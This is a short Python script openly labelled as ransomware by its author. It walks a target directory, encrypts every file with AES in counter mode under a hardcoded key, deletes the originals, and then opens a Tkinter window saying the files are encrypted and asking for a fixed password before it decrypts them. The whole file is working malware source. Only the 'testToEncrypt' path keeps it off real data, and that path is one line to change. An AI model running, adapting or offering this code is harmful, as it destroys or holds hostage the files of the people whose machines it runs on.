#!/usr/bin/python3
from Crypto.Cipher import AES
from Crypto import Random
from Crypto.Util import Counter
import os
import os.path
import tkinter as tk
from tkinter import messagebox
# this ransomeware is created by SAFAN05

def encrypt_file(file_path,key):
    # read file
    with open(file_path,'rb') as f:
        data = f.read()
    # encrypt the file
    counter = Counter.new(128)
    c= AES.new(key,AES.MODE_CTR,counter= counter)
    encrypted= c.encrypt(data)
    # overwrite file with encrypted 
    with open(file_path + '.enc',"wb") as f:
        f.write(encrypted)
    os.remove(file_path)

def encrypt_dir(dir_path,key):
    for dir,subDir,files in os.walk(dir_path):
        for file in files:
            path=os.path.join(dir,file)
            if not file.endswith(".enc"):
                encrypt_file(path,key)

def decrypt_file(file_path,key):
    # read file
    with open(file_path,'rb') as f:
        data = f.read()
    # encrypt the file
    counter = Counter.new(128)
    c= AES.new(key,AES.MODE_CTR,counter= counter)
    decrypted= c.decrypt(data)
    original_path = file_path.replace('.enc', '')
    # overwrite file with encrypted 
    with open(original_path ,"wb") as f:
        f.write(decrypted)
    os.remove(file_path)

def decrypt_dir(dir_path,key):
    for dir,subDir,files in os.walk(dir_path):
        for file in files:
            path=os.path.join(dir,file)
            if file.endswith(".enc"):
                decrypt_file(path,key)

def show_ransom_gui(target,key):
    def try_decrypt():
        if entry.get() == "Safan Hacked Me":
            decrypt_dir(target,key)
            messagebox.showinfo("Unlocked", "Files decrypted")
            root.destroy()
        else:
            messagebox.showerror("Wrong Password", "Try again.")

    root = tk.Tk()
    root.title("Your Files Are Encrypted")
    root.geometry("350x150")

    label = tk.Label(root, text="Your files have been encrypted!\nEnter the password to decrypt:")
    label.pack(pady=10)

    entry = tk.Entry(root)
    entry.pack()

    btn = tk.Button(root, text="Decrypt", command=try_decrypt)
    btn.pack(pady=10)

    root.mainloop()

key=b'\xf1\x03{\x96z\xfc@h\xd2\xe2\x16q\xc8\xe1\x94\x1f'

target = "/testToEncrypt"
encrypt_dir(target,key)
show_ransom_gui(target,key)